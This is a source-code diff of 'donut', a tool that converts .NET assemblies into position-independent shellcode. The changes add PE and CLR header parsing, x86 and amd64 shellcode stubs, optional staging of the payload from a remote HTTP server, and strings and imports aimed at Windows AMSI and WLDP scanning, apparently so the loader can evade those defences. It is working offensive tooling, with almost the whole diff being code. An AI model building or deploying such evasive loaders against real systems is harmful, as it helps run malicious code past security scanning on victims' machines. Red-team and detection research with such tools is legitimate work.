@@ -33,19 +33,41 @@
 
 #include "payload/payload_exe_x86.h"
 #include "payload/payload_exe_x64.h"
-
+  
+#define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
+#define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
+#define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }
+#define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
+ 
 // these have to be in same order as structure in donut.h
 static API_IMPORT api_imports[]=
 { {KERNEL32_DLL, "LoadLibraryA"},
+  {KERNEL32_DLL, "LoadLibraryExA"},
   {KERNEL32_DLL, "GetProcAddress"},
+  {KERNEL32_DLL, "GetModuleHandleA"},
+  
+  {KERNEL32_DLL, "AllocConsole"},
+  {KERNEL32_DLL, "AttachConsole"},
+  {KERNEL32_DLL, "GetCurrentProcessId"},
+  {KERNEL32_DLL, "GetCurrentThreadId"},
+  {KERNEL32_DLL, "SetConsoleCtrlHandler"},
+  {KERNEL32_DLL, "GetStdHandle"},
+  {KERNEL32_DLL, "SetStdHandle"},
+  {KERNEL32_DLL, "CreateFileA"},
+  {KERNEL32_DLL, "CreateProcessA"},
+  {KERNEL32_DLL, "WaitForSingleObject"},
   
   {KERNEL32_DLL, "VirtualAlloc"},
   {KERNEL32_DLL, "VirtualFree"},
+  {KERNEL32_DLL, "VirtualQuery"},
+  {KERNEL32_DLL, "VirtualProtect"},
   
   {OLEAUT32_DLL, "SafeArrayCreate"},
   {OLEAUT32_DLL, "SafeArrayCreateVector"},
   {OLEAUT32_DLL, "SafeArrayPutElement"},
   {OLEAUT32_DLL, "SafeArrayDestroy"},
+  {OLEAUT32_DLL, "SafeArrayGetLBound"},
+  {OLEAUT32_DLL, "SafeArrayGetUBound"},
   {OLEAUT32_DLL, "SysAllocString"},
   {OLEAUT32_DLL, "SysFreeString"},
   
@@ -61,6 +83,8 @@ static API_IMPORT api_imports[]=
   
   {MSCOREE_DLL,  "CorBindToRuntime"},
   {MSCOREE_DLL,  "CLRCreateInstance"},
+  
+  {SHLWAPI_DLL,  "SHGetValueA"},
   
   { NULL, NULL }
 };
@@ -83,9 +107,9 @@ static GUID xIID_ICLRRuntimeInfo = {
 static GUID xIID_AppDomain = {
   0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
   
-static size_t utf8_to_utf16(wchar_t* dst, const char* src, size_t len) {
+static uint64_t utf8_to_utf16(wchar_t* dst, const char* src, uint64_t len) {
     uint16_t *out = (uint16_t*)dst;
-    size_t   i;
+    uint64_t   i;
     
     for(i=0; src[i] != 0 && i < len; i++) {
       out[i] = src[i];
@@ -93,8 +117,271 @@ static size_t utf8_to_utf16(wchar_t* dst, const char* src, size_t len) {
     return i;
 }
 
+static int GetModuleType(const char *file) {
+    IMAGE_DOS_HEADER   dos;
+    IMAGE_NT_HEADERS64 nt;
+    int                fd, type = -1;
+    
+    DPRINT("Opening %s", file);
+    fd = open(file, O_RDONLY);
+    if(fd < 0) return -1;
+    
+    DPRINT("Reading IMAGE_DOS_HEADER");
+    read(fd, &dos, sizeof(dos));
+    DPRINT("Checking e_magic");
+    
+    if(dos.e_magic == IMAGE_DOS_SIGNATURE) {
+      DPRINT("Seeking position of IMAGE_NT_HEADERS");
+      lseek(fd, dos.e_lfanew, SEEK_SET);
+      DPRINT("Reading IMAGE_NT_HEADERS");
+      read(fd, &nt, sizeof(nt));
+      DPRINT("Checking Signature");
+      
+      if(nt.Signature == IMAGE_NT_SIGNATURE) {
+        DPRINT("Characteristics : %04lx", nt.FileHeader.Characteristics);
+        if(nt.FileHeader.Characteristics & IMAGE_FILE_DLL) {
+          type = DONUT_MODULE_DLL;
+        } else {
+          type = DONUT_MODULE_EXE;
+        }
+      }
+    }
+    close(fd);
+    return type;
+}
+
+// return pointer to DOS header
+PIMAGE_DOS_HEADER DosHdr(void *map) {
+    return (PIMAGE_DOS_HEADER)map;
+}
+
+// return pointer to NT headers
+PIMAGE_NT_HEADERS NtHdr (void *map) {
+    return (PIMAGE_NT_HEADERS) ((uint8_t*)map + DosHdr(map)->e_lfanew);
+}
+
+// return pointer to File header
+PIMAGE_FILE_HEADER FileHdr (void *map) {
+    return &NtHdr(map)->FileHeader;
+}
+
+// determines CPU architecture of binary
+int is32 (void *map) {
+    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_I386;
+}
+
+// determines CPU architecture of binary
+int is64 (void *map) {
+    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_AMD64;
+}
+
+// return pointer to Optional header
+void* OptHdr (void *map) {
+    return (void*)&NtHdr(map)->OptionalHeader;
+}
+
+// return pointer to first section header
+PIMAGE_SECTION_HEADER SecHdr (void *map) {
+    PIMAGE_NT_HEADERS nt = NtHdr(map);
+  
+    return (PIMAGE_SECTION_HEADER)((uint8_t*)&nt->OptionalHeader + 
+    nt->FileHeader.SizeOfOptionalHeader);
+}
+
+uint32_t SecSize (void *map) {
+    return NtHdr(map)->FileHeader.NumberOfSections;
+}
+
+PIMAGE_DATA_DIRECTORY Dirs (void *map) {
+    if (is32(map)) {
+      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr(map))->DataDirectory;
+    } else {
+      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr(map))->DataDirectory;
+    }
+}
+
+// valid dos header?
+int valid_dos_hdr (void *map) {
+    PIMAGE_DOS_HEADER dos = DosHdr(map);
+    
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
+    return (dos->e_lfanew != 0);
+}
+
+// valid nt headers
+int valid_nt_hdr (void *map) {
+    return NtHdr(map)->Signature == IMAGE_NT_SIGNATURE;
+}
+
+void set_subsystem(void *map, uint16_t subsystem) {
+    PIMAGE_OPTIONAL_HEADER32 hdr32;
+    PIMAGE_OPTIONAL_HEADER64 hdr64;
+    #ifdef DEBUG
+    uint16_t                 ss;
+    #endif
+    
+    if(is32(map)) {
+      hdr32 = (PIMAGE_OPTIONAL_HEADER32)OptHdr(map);
+      #ifdef DEBUG
+      ss = hdr32->Subsystem;
+      #endif
+      hdr32->Subsystem = subsystem;
+    } else {
+      hdr64 = (PIMAGE_OPTIONAL_HEADER64)OptHdr(map);
+      #ifdef DEBUG
+      ss = hdr64->Subsystem;
+      #endif
+      hdr64->Subsystem = subsystem;
+    }
+    DPRINT("Subsystem before reset : %02x", ss);
+}
+
+uint64_t rva2ofs (void *map, uint32_t rva) {
+    int i;
+    uint64_t ofs;
+    
+    PIMAGE_SECTION_HEADER sh = SecHdr(map);
+    
+    for (i=0; i<SecSize(map); i++) {
+      DPRINT("Checking %s", sh[i].Name);
+      if (rva >= sh[i].VirtualAddress && 
+          rva <  sh[i].VirtualAddress + sh[i].SizeOfRawData) {
+        DPRINT("RawData : %08lx  VA : %08lx for RVA : %08lx", 
+          sh[i].PointerToRawData,
+          sh[i].VirtualAddress, 
+          rva);
+          
+        ofs = sh[i].PointerToRawData + (rva - sh[i].VirtualAddress);
+        DPRINT("OFS : %016llx Base : %p", ofs, map);
+        return ofs;
+      }
+    }
+    return -1;
+}
+
+// Per the ECMA spec, the section data looks like this:
+typedef struct tagMDSTORAGESIGNATURE {
+    ULONG       lSignature;             // "Magic" signature.
+    USHORT      iMajorVer;              // Major file version.
+    USHORT      iMinorVer;              // Minor file version.
+    ULONG       iExtraData;             // Offset to next structure of information 
+    ULONG       iVersionString;         // Length of version string
+    BYTE        pVersion[0];            // Version string
+} MDSTORAGESIGNATURE, *PMDSTORAGESIGNATURE;
+
+static char *GetVersionFromFile(const char *file) {
+    PIMAGE_COR20_HEADER   cor; 
+    PIMAGE_DATA_DIRECTORY dir;
+    DWORD                 rva;
+    int                   fd;
+    struct stat           fs;
+    uint8_t               *base;
+    PMDSTORAGESIGNATURE   pss;
+    static char           version[32];
+    uint64_t              ofs;
+    
+    // default if no version can be retrieved
+    strcpy(version, "v4.0.30319");
+    
+    DPRINT("Opening %s", file);
+    fd = open(file, O_RDONLY);
+    if(fd < 0) return version;
+    
+    // get the size of assembly
+    if(fstat(fd, &fs) == 0) {
+      // map into memory
+      DPRINT("Mapping %i bytes for %s", fs.st_size, file);
+      base = (uint8_t*)mmap(NULL, fs.st_size,  
+        PROT_READ, MAP_PRIVATE, fd, 0);
+        
+      if(base != NULL) {
+        DPRINT("Reading IMAGE_COR20_HEADER");
+        dir = Dirs(base);
+        rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
+        DPRINT("RVA : %08lx", rva);
+        
+        if(rva != 0) {
+          ofs = rva2ofs(base, rva);
+          if (ofs != -1) {
+            cor = (PIMAGE_COR20_HEADER)(ofs + base);
+            DPRINT("PIMAGE_COR20_HEADER : %p", cor);
+            rva = cor->MetaData.VirtualAddress;
+            DPRINT("RVA : %08lx", rva);
+            if(rva != 0) {
+              ofs = rva2ofs(base, rva);
+              DPRINT("RVA2OFS(rva=%08lx, ofs=%016llx)", rva, ofs);
+              if(ofs != -1) {
+                pss = (PMDSTORAGESIGNATURE)(ofs + base);
+                strncpy(version, (char*)pss->pVersion, sizeof(version) - 1);
+              }
+            }
+          }
+        }
+        munmap(base, fs.st_size);
+      }
+    }
+    DPRINT("Version : %s", version);
+    DPRINT("Closing %s", file);
+    close(fd);
+    
+    return version;
+}
+
+// Tries to determine if assembly is valid
+// Using simple checks..
+int IsValidAssembly(const char *path) {
+    int                   fd, valid = 0;
+    struct stat           fs;
+    PIMAGE_COR20_HEADER   cor; 
+    PIMAGE_DATA_DIRECTORY dir;
+    DWORD                 rva, len;
+    uint64_t              ofs;
+    uint8_t               *base;
+    
+    DPRINT("Opening %s", path);
+    fd = open(path, O_RDONLY);
+    if(fd < 0) return 0;
+    
+    // get the size of assembly
+    if(fstat(fd, &fs) == 0) {
+      // map into memory
+      DPRINT("Mapping %i bytes for %s", fs.st_size, path);
+      base = (uint8_t*)mmap(NULL, fs.st_size,  
+        PROT_READ, MAP_PRIVATE, fd, 0);
+        
+      if(base != NULL) {
+        DPRINT("Checking DOS header");
+        if(valid_dos_hdr(base)) {
+          DPRINT("Checking NT header");
+          if(valid_nt_hdr(base)) {
+            DPRINT("Checking COM directory");
+            dir = Dirs(base);
+            if(dir != NULL) {
+              rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
+              len = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size;
+              ofs = rva2ofs(base, rva);
+              DPRINT("RVA2OFS(rva=%08lx, ofs=%016llx)", rva, ofs);
+              
+              if(ofs != -1) {
+                cor = (PIMAGE_COR20_HEADER)(ofs + base);
+                valid = (rva != 0 && len != 0 && cor != NULL);
+              }
+            }
+          }
+        }
+        DPRINT("Unmapping");
+        munmap(base, fs.st_size);
+      }
+    }
+    DPRINT("Closing %s", path);
+    DPRINT("%s is valid assembly : %s", 
+      path, valid ? "TRUE" : "FALSE");
+    close(fd);
+    return valid;
+}
+
 // returns 1 on success else <=0
-static int CreateRandom(void *buf, size_t len) {
+static int CreateRandom(void *buf, uint64_t len) {
     
 #if defined(WINDOWS)
     HCRYPTPROV prov;
@@ -112,7 +399,7 @@ static int CreateRandom(void *buf, size_t len) {
     return ok;
 #else
     int      fd;
-    size_t   r=0;
+    uint64_t   r=0;
     uint8_t *p=(uint8_t*)buf;
     
     DPRINT("Opening /dev/urandom to acquire %li bytes", len);
@@ -129,9 +416,9 @@ static int CreateRandom(void *buf, size_t len) {
 #endif
 }
 
-// generate a random string, not exceeding DONUT_MAX_NAME bytes
+// Generate a random string, not exceeding DONUT_MAX_NAME bytes
 // tbl is from https://stackoverflow.com/a/27459196
-static int GenRandomString(void *output, size_t len) {
+static int GenRandomString(void *output, uint64_t len) {
     uint8_t rnd[DONUT_MAX_NAME];
     int     i;
     char    tbl[]="HMN34P67R9TWCXYF"; 
@@ -154,41 +441,35 @@ static int CreateModule(PDONUT_CONFIG c) {
     struct stat   fs;
     FILE          *fd;
     PDONUT_MODULE mod = NULL;
-    size_t        len = 0;
-    char          *param;
+    uint64_t        len = 0;
+    char          *param, parambuf[DONUT_MAX_NAME*DONUT_MAX_PARAM];
     int           cnt, err=DONUT_ERROR_SUCCESS;
     
-    // no config? exit
-    DPRINT("Checking configuration");
-    if(c == NULL || c->file == NULL) {
-      return DONUT_ERROR_INVALID_PARAMETER;
-    }
-    c->mod = NULL;
-    c->mod_len = 0;
-    // inaccessibe? exit
+    // Assembly is inaccessibe? exit
     DPRINT("stat(%s)", c->file);
     if(stat(c->file, &fs) != 0) return DONUT_ERROR_ASSEMBLY_NOT_FOUND;
 
-    // zero file size? exit
+    // Zero file size? exit
     if(fs.st_size == 0) return DONUT_ERROR_ASSEMBLY_EMPTY;
 
-    // try open assembly
+    // Open assembly
     DPRINT("Opening %s...", c->file);
     fd = fopen(c->file, "rb");
 
-    // not opened? return
+    // Not opened? return
     if(fd == NULL) return DONUT_ERROR_ASSEMBLY_ACCESS;
 
-    // allocate memory for module information and assembly
+    // Allocate memory for module information and assembly
     len = sizeof(DONUT_MODULE) + fs.st_size;
-    DPRINT("Allocating %zi bytes of memory for DONUT_MODULE", len);
+    DPRINT("Allocating %" PRIi64 " bytes of memory for DONUT_MODULE", len);
     mod = calloc(len, sizeof(uint8_t));
 
-    // if memory allocated
+    // If memory allocated
     if(mod != NULL) {
-      // initialize domain, namespace/class, method and runtime version
+      // Set the type
+      mod->type = c->mod_type;
       
-      // if no domain name specified, generate a random string for it
+      // If no domain name specified, generate a random string for it
       if(c->domain[0] == 0) {
         if(!GenRandomString(c->domain, 8)) {
           return DONUT_ERROR_RANDOM;
@@ -198,22 +479,28 @@ static int CreateModule(PDONUT_CONFIG c) {
       DPRINT("Domain  : %s", c->domain);
       utf8_to_utf16((wchar_t*)mod->domain,  c->domain, strlen(c->domain));
       
-      DPRINT("Class   : %s", c->cls);
-      utf8_to_utf16((wchar_t*)mod->cls,     c->cls,    strlen(c->cls));
+      // If assembly is DLL, we expect a class and method from user
+      if(mod->type == DONUT_MODULE_DLL) {
+        DPRINT("Class   : %s", c->cls);
+        utf8_to_utf16((wchar_t*)mod->cls,     c->cls,    strlen(c->cls));
       
-      DPRINT("Method  : %s", c->method);
-      utf8_to_utf16((wchar_t*)mod->method,  c->method, strlen(c->method));
+        DPRINT("Method  : %s", c->method);
+        utf8_to_utf16((wchar_t*)mod->method,  c->method, strlen(c->method));
+      }
       
-      if(c->runtime[0] == 0) strcpy(c->runtime, DONUT_RUNTIME_NET4);
-      
+      // If no runtime specified, use from meta header
+      if(c->runtime[0] == 0) {
+        strncpy(c->runtime, GetVersionFromFile(c->file), DONUT_MAX_NAME - 1);
+      }
       DPRINT("Runtime : %s", c->runtime);
       utf8_to_utf16((wchar_t*)mod->runtime, c->runtime, strlen(c->runtime));
 
       // if parameters specified
       if(c->param != NULL) {
+        strncpy(parambuf, c->param, sizeof(parambuf)-1);
         cnt = 0;
         // split by comma or semi-colon
-        param = strtok(c->param, ",;");
+        param = strtok(parambuf, ",;");
         
         while(param != NULL && cnt < DONUT_MAX_PARAM) {
           if(strlen(param) >= DONUT_MAX_NAME) {
@@ -236,6 +523,8 @@ static int CreateModule(PDONUT_CONFIG c) {
         mod->len = fs.st_size;
         // read assembly into memory
         fread(&mod->data, 1, fs.st_size, fd);
+        // set the subsystem to GUI incase it CUI
+        // set_subsystem(mod->data, IMAGE_SUBSYSTEM_WINDOWS_GUI);
         // update configuration with pointer to module
         c->mod     = mod;
         c->mod_len = len;
@@ -253,7 +542,7 @@ static int CreateModule(PDONUT_CONFIG c) {
 static int CreateInstance(PDONUT_CONFIG c) {
     DONUT_CRYPT     inst_key, mod_key;
     PDONUT_INSTANCE inst = NULL;
-    size_t          url_len, inst_len = 0;
+    uint64_t          url_len, inst_len = 0;
     uint64_t        dll_hash=0, iv=0;
     int             cnt, slash=0;
     char            sig[DONUT_MAX_NAME];
@@ -265,7 +554,7 @@ static int CreateInstance(PDONUT_CONFIG c) {
     }
     // if this is URL instance, ensure url paramter and module name
     // don't exceed DONUT_MAX_URL
-    if(c->type == DONUT_INSTANCE_URL) {
+    if(c->inst_type == DONUT_INSTANCE_URL) {
       url_len = strlen(c->url);
       
       // if the end of string doesn't have a forward slash
@@ -281,11 +570,11 @@ static int CreateInstance(PDONUT_CONFIG c) {
       return DONUT_ERROR_RANDOM;
     }
 #if !defined(NOCRYPTO)
-    DPRINT("Generating random key for donut_encrypting instance");
+    DPRINT("Generating random key for encrypting instance");
     if(!CreateRandom(&inst_key, sizeof(DONUT_CRYPT))) {
       return DONUT_ERROR_RANDOM;
     }
-    DPRINT("Generating random key for donut_encrypting module");
+    DPRINT("Generating random key for encrypting module");
     if(!CreateRandom(&mod_key, sizeof(DONUT_CRYPT))) {
       return DONUT_ERROR_RANDOM;
     }
@@ -296,7 +585,7 @@ static int CreateInstance(PDONUT_CONFIG c) {
 #endif
     // if this is a URL instance, generate a random name for module
     // that will be saved to disk
-    if(c->type == DONUT_INSTANCE_URL) {
+    if(c->inst_type == DONUT_INSTANCE_URL) {
       if(!GenRandomString(c->modname, DONUT_MAX_MODNAME)) {
         return DONUT_ERROR_RANDOM;
       }
@@ -309,8 +598,8 @@ static int CreateInstance(PDONUT_CONFIG c) {
     
     // if this is a PIC instance, add the size of module
     // which will be appended to the end of structure
-    if(c->type == DONUT_INSTANCE_PIC) {
-      DPRINT("The size of module is %i bytes. " 
+    if(c->inst_type == DONUT_INSTANCE_PIC) {
+      DPRINT("The size of module is %" PRIi64 " bytes. " 
              "Adding to size of instance.", c->mod_len);
       inst_len += c->mod_len;
     }
@@ -336,12 +625,25 @@ static int CreateInstance(PDONUT_CONFIG c) {
     memcpy(&inst->xIID_ICorRuntimeHost,  &xIID_ICorRuntimeHost,  sizeof(GUID));
     memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));
 
-    DPRINT("Copying DLL strings to instance");
-    inst->dll_cnt = 3;
+    strcpy(inst->amsi.s,    "AMSI");
+    strcpy(inst->amsiInit,  "AmsiInitialize");
+    strcpy(inst->amsiScan,  "AmsiScanBuffer");
     
-    strncpy(inst->dll_name[0], "mscoree.dll", DONUT_MAX_NAME-1);
-    strncpy(inst->dll_name[1], "oleaut32.dll",DONUT_MAX_NAME-1);
-    strncpy(inst->dll_name[2], "wininet.dll" ,DONUT_MAX_NAME-1);
+    strcpy(inst->clr,       "CLR");
+    
+    strcpy(inst->wldp,      "WLDP");
+    strcpy(inst->wldpQuery, "WldpQueryDynamicCodeTrust");
+    
+    strcpy(inst->subkey,    "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full");
+    strcpy(inst->value,     "Release");
+
+    DPRINT("Copying DLL strings to instance");
+    inst->dll_cnt = 4;
+    
+    strcpy(inst->dll_name[0], "mscoree.dll");
+    strcpy(inst->dll_name[1], "oleaut32.dll");
+    strcpy(inst->dll_name[2], "wininet.dll");
+    strcpy(inst->dll_name[3], "shlwapi.dll");
 
     DPRINT("Generating hashes for API using IV: %" PRIx64, iv);
     inst->iv = iv;
@@ -354,7 +656,7 @@ static int CreateInstance(PDONUT_CONFIG c) {
       // xor with DLL hash and store in instance
       inst->api.hash[cnt] = maru(api_imports[cnt].name, iv) ^ dll_hash;
       
-      DPRINT("Hash for %-15s : %-22s = %" PRIx64, 
+      DPRINT("Hash for %-15s : %-22s = %" PRIX64, 
         api_imports[cnt].module, 
         api_imports[cnt].name,
         inst->api.hash[cnt]);
@@ -363,11 +665,11 @@ static int CreateInstance(PDONUT_CONFIG c) {
     inst->api_cnt = cnt;
 
     // set the type of instance we're creating
-    inst->type = c->type;
+    inst->type = c->inst_type;
 
     // if the module will be downloaded
     // set the URL parameter and request verb
-    if(c->type == DONUT_INSTANCE_URL) {
+    if(inst->type == DONUT_INSTANCE_URL) {
       DPRINT("Setting URL parameters");
       
       strcpy(inst->http.url, c->url);
@@ -390,8 +692,8 @@ static int CreateInstance(PDONUT_CONFIG c) {
     strcpy((char*)inst->sig, sig);
     
 #if !defined(NOCRYPTO)
-    if(c->type == DONUT_INSTANCE_URL) {
-      DPRINT("donut_encrypting module for download");
+    if(c->inst_type == DONUT_INSTANCE_URL) {
+      DPRINT("encrypting module for download");
       
       c->mod->mac = maru(inst->sig, inst->iv);
       
@@ -403,13 +705,13 @@ static int CreateInstance(PDONUT_CONFIG c) {
     }
 #endif
     // if PIC, copy module to instance
-    if(c->type == DONUT_INSTANCE_PIC) {
+    if(inst->type == DONUT_INSTANCE_PIC) {
       DPRINT("Copying module data to instance");
       memcpy(&c->inst->module.x, c->mod, c->mod_len);
     }
     
 #if !defined(NOCRYPTO)
-    DPRINT("donut_encrypting instance");
+    DPRINT("encrypting instance");
     
     inst->mac = maru(inst->sig, inst->iv);
     
@@ -427,25 +729,13 @@ static int CreateInstance(PDONUT_CONFIG c) {
   
 // given a configuration, create a PIC that will run from anywhere in memory
 EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) {
-    uint8_t *pl, *pld;
-    size_t  plen;
-    int     err = DONUT_ERROR_SUCCESS;
-    FILE    *fd;
+    uint8_t  *pl;
+    uint32_t t;
+    int      err = DONUT_ERROR_SUCCESS;
+    FILE     *fd;
     
-    if(c         == NULL || 
-       c->file   == NULL ||
-       c->method == NULL ||
-       c->cls    == NULL) {
-      return DONUT_ERROR_INVALID_PARAMETER;
-    }
-    
-    if(c->type != DONUT_INSTANCE_PIC &&
-       c->type != DONUT_INSTANCE_URL) {
-      return DONUT_ERROR_INVALID_PARAMETER;
-    }
-    
-    if(c->type == DONUT_INSTANCE_URL &&
-       c->url[0] == 0) {
+    DPRINT("Validating configuration and path of assembly");
+    if(c == NULL || c->file == NULL) {
       return DONUT_ERROR_INVALID_PARAMETER;
     }
     
@@ -458,17 +748,53 @@ EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) {
     c->pic      = NULL;
     c->pic_len  = 0;
     
-    switch(c->arch) {
-      case DONUT_ARCH_X86 :
-        pld  = (uint8_t*)PAYLOAD_EXE_X86;
-        plen = sizeof(PAYLOAD_EXE_X86);
-        break;
-      case DONUT_ARCH_X64 :
-        pld  = (uint8_t*)PAYLOAD_EXE_X64;
-        plen = sizeof(PAYLOAD_EXE_X64); 
-        break;
-      default:
-        return DONUT_ERROR_INVALID_ARCH;
+    // Valid assembly?
+    DPRINT("Validating assembly");
+    if(!IsValidAssembly(c->file)) return DONUT_ERROR_ASSEMBLY_INVALID;
+    
+    DPRINT("Validating instance type");
+    if(c->inst_type != DONUT_INSTANCE_PIC &&
+       c->inst_type != DONUT_INSTANCE_URL) {
+         
+      return DONUT_ERROR_INVALID_PARAMETER;
+    }
+    
+    if(c->inst_type == DONUT_INSTANCE_URL) {
+      DPRINT("Validating URL");
+      if(c->url[0] == 0) return DONUT_ERROR_INVALID_PARAMETER;
+      
+      if((strnicmp(c->url, "http://",  7) != 0) &&
+         (strnicmp(c->url, "https://", 8) != 0)) {
+           
+        return DONUT_ERROR_INVALID_URL;
+      }
+      if(strlen(c->url) < 8) return DONUT_ERROR_INVALID_URL;
+    }
+    
+    // get runtime version
+    GetVersionFromFile(c->file);
+    
+    DPRINT("Getting type of module");
+    c->mod_type = GetModuleType(c->file);
+    if(c->mod_type < 0) return DONUT_ERROR_ASSEMBLY_INVALID;
+    
+    DPRINT("Validating module type");
+    if(c->mod_type != DONUT_MODULE_DLL &&
+       c->mod_type != DONUT_MODULE_EXE) {
+      return DONUT_ERROR_INVALID_PARAMETER;
+    }
+    if(c->mod_type == DONUT_MODULE_DLL) {
+      DPRINT("Validating class and method for DLL");
+      if(c->cls == NULL || c->method == NULL) {
+        return DONUT_ERROR_ASSEMBLY_PARAMS;
+      }
+    }
+    DPRINT("Checking architecture");
+    if(c->arch != DONUT_ARCH_X86 &&
+       c->arch != DONUT_ARCH_X64 &&
+       c->arch != DONUT_ARCH_X84)
+    {
+      return DONUT_ERROR_INVALID_ARCH;
     }
     
     // 1. create the module
@@ -490,7 +816,7 @@ EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) {
           }
         #endif
         // 3. if this module will be stored on a remote server
-        if(c->type == DONUT_INSTANCE_URL) {
+        if(c->inst_type == DONUT_INSTANCE_URL) {
           DPRINT("Saving %s to disk.", c->modname);
           // save the module to disk using random name
           fd = fopen(c->modname, "wb");
@@ -501,27 +827,68 @@ EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) {
           }
         }
         // 4. calculate size of PIC + instance combined
-        // allow additional space for some x86/amd64 opcodes
-        c->pic_len = plen + c->inst_len + 8;
-        c->pic     = malloc(c->pic_len);
+        if(c->arch == DONUT_ARCH_X86) {
+          c->pic_len = sizeof(PAYLOAD_EXE_X86) + c->inst_len + 32;
+        } else if(c->arch == DONUT_ARCH_X64) {
+          c->pic_len = sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
+        } else if(c->arch == DONUT_ARCH_X84) {
+          c->pic_len = sizeof(PAYLOAD_EXE_X86) + 
+                       sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
+        }
+        // 5. allocate memory for shellcode
+        c->pic = malloc(c->pic_len);
+        
+        DPRINT("PIC size : %" PRIi64, c->pic_len);
         
         if(c->pic != NULL) {
+          DPRINT("Inserting opcodes");
+          // 6. insert shellcode
           pl = (uint8_t*)c->pic;
-          // for now, only x86 and amd64 are supported.
-          // since the payload is written in C, 
-          // adding support for ARM64 shouldn't be difficult
-          *pl++ = 0xE8;                       // insert call opcode
-          ((uint32_t*)pl)[0] = c->inst_len;   // insert offset to executable code
-          pl += sizeof(uint32_t);             // skip 4 bytes used for offset
-          // copy the instance (plus the module if attached)
-          memcpy(pl, c->inst, c->inst_len);  
-          pl += c->inst_len;                  // skip instance
-          // we use fastcall convention for 32-bit code.
-          // microsoft fastcall is used by default for 64-bit code.
-          // the pointer to instance is placed in ecx/rcx
-          *pl++ = 0x59;                       // insert pop ecx / pop rcx
-          // copy the assembly code
-          memcpy(pl, pld, plen);
+          // call $ + c->inst_len
+          PUT_BYTE(pl,  0xE8);
+          PUT_WORD(pl,  c->inst_len);
+          PUT_BYTES(pl, c->inst, c->inst_len);
+          // pop ecx
+          PUT_BYTE(pl,  0x59);
+          
+          if(c->arch == DONUT_ARCH_X86) {
+            // pop edx
+            PUT_BYTE(pl, 0x5A);
+            // push ecx
+            PUT_BYTE(pl, 0x51);
+            // push edx
+            PUT_BYTE(pl, 0x52);
+            DPRINT("Copying %" PRIi64 " bytes of x86 shellcode", 
+              (uint64_t)sizeof(PAYLOAD_EXE_X86));
+              
+            PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
+          } else if(c->arch == DONUT_ARCH_X64) {
+            DPRINT("Copying %" PRIi64 " bytes of amd64 shellcode", 
+              (uint64_t)sizeof(PAYLOAD_EXE_X64));
+              
+            PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
+          } else if(c->arch == DONUT_ARCH_X84) {
+            DPRINT("Copying %" PRIi64 " bytes of x86 + amd64 shellcode",
+              (uint64_t)(sizeof(PAYLOAD_EXE_X86) + sizeof(PAYLOAD_EXE_X64)));
+              
+            // xor eax, eax
+            PUT_BYTE(pl, 0x31);
+            PUT_BYTE(pl, 0xC0);
+            // dec eax
+            PUT_BYTE(pl, 0x48);
+            // js dword x86_code
+            PUT_BYTE(pl, 0x0F);
+            PUT_BYTE(pl, 0x88);
+            PUT_WORD(pl,  sizeof(PAYLOAD_EXE_X64));
+            PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
+            // pop edx
+            PUT_BYTE(pl, 0x5A);
+            // push ecx
+            PUT_BYTE(pl, 0x51);
+            // push edx
+            PUT_BYTE(pl, 0x52);
+            PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
+          }
           err = DONUT_ERROR_SUCCESS;
         } else err = DONUT_ERROR_NO_MEMORY;
       }
@@ -574,11 +941,20 @@ const char *err2str(int err) {
       case DONUT_ERROR_ASSEMBLY_ACCESS:
         str = "Cannot open assembly";
         break;
+      case DONUT_ERROR_ASSEMBLY_INVALID:
+        str = "Assembly is invalid";
+        break;      
+      case DONUT_ERROR_ASSEMBLY_PARAMS:
+        str = "Assembly is a DLL. Requires class and method";
+        break;
       case DONUT_ERROR_NO_MEMORY:
         str = "No memory available";
         break;
       case DONUT_ERROR_INVALID_ARCH:
         str = "Invalid architecture specified";
+        break;      
+      case DONUT_ERROR_INVALID_URL:
+        str = "Invalid URL";
         break;
       case DONUT_ERROR_URL_LENGTH:
         str = "Invalid URL length";
@@ -607,21 +983,22 @@ static char* get_param (int argc, char *argv[], int *i) {
 }
 
 static void usage (void) {
-    printf("\n  usage: donut [options] -f <.NET assembly> -c <namespace.class> -m <Method>\n\n");
+    printf("\n  usage: donut [options] -f <.NET assembly>\n\n");
     
     printf("       -f <path>            .NET assembly to embed in PIC and DLL.\n");
-    printf("       -u <URL>             HTTP server hosting the .NET assembly.\n");
+    printf("       -u <URL>             HTTP server that will host the .NET assembly.\n");
     
-    printf("       -c <namespace.class> The assembly class name.\n");
-    printf("       -m <method>          The assembly method name.\n");
-    printf("       -p <arg1,arg2...>    Optional parameters for method, separated by comma or semi-colon.\n");
+    printf("       -c <namespace.class> Optional class name. (required for DLL)\n");
+    printf("       -m <method>          Optional method name. (required for DLL)\n");
+    printf("       -p <arg1,arg2...>    Optional parameters or command line, separated by comma or semi-colon.\n");
     
